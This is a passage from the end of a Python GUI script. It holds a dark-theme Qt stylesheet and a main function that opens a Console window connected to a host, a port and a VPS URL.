        QTreeWidget::item:selected { background:#3c5082; color:#fff; }
        QTreeWidget::item:hover { background:#2a2a48; }
        QHeaderView::section { background:#23233a; color:#c8c8e6; border:none; border-right:1px solid #303048; border-bottom:1px solid #303048; padding:4px 8px; font-family:Consolas; font-size:9pt; font-weight:bold; }
        QHeaderView::section:horizontal:hover { background:#2e2e4a; }
        QTextEdit { background:#161620; color:#c3c3c3; }
        QLineEdit { background:#161620; color:#d0d0d0; border:1px solid #303048; border-radius:3px; padding:3px 6px; }
        QLineEdit:focus { border-color:#6495ed; }
        QComboBox { background:#1e1e30; color:#d0d0d0; border:1px solid #303048; border-radius:3px; padding:2px 6px; }
        QComboBox::drop-down { border:none; width:20px; }
        QComboBox QAbstractItemView { background:#22223a; color:#d0d0d0; selection-background-color:#3c5082; border:1px solid #303048; }
        QMenu { background:#222238; color:#d0d0d0; border:1px solid #404060; }
        QMenu::item:selected { background:#3c5082; }
        QMenu::separator { height:1px; background:#303048; margin:3px 6px; }
        QStatusBar { background:#181822; color:#8090b0; border-top:1px solid #28283a; }
        QToolTip { background:#282840; color:#e0e0e0; border:1px solid #404060; }
        QMessageBox { background:#1e1e28; }
        QMessageBox QLabel { color:#d0d0d0; }
        QCheckBox { spacing:6px; }
        QCheckBox::indicator { width:14px; height:14px; border:1px solid #404060; border-radius:2px; background:#1e1e30; }
        QCheckBox::indicator:checked { background:#306030; border-color:#64dc82; }
    """)

    w = Console(args.host, args.port, vps_url)
    w.show()
    sys.exit(_exec(app))


if __name__ == "__main__":
    main()
